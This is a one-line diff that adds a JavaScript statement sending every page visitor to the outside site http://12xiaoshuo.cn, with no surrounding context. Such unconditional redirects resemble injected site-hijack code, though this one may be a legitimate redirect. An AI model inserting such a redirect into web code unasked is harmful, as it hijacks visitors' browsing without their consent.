@@ -1,0 +1,1 @@
+window.location.href="http://12xiaoshuo.cn";
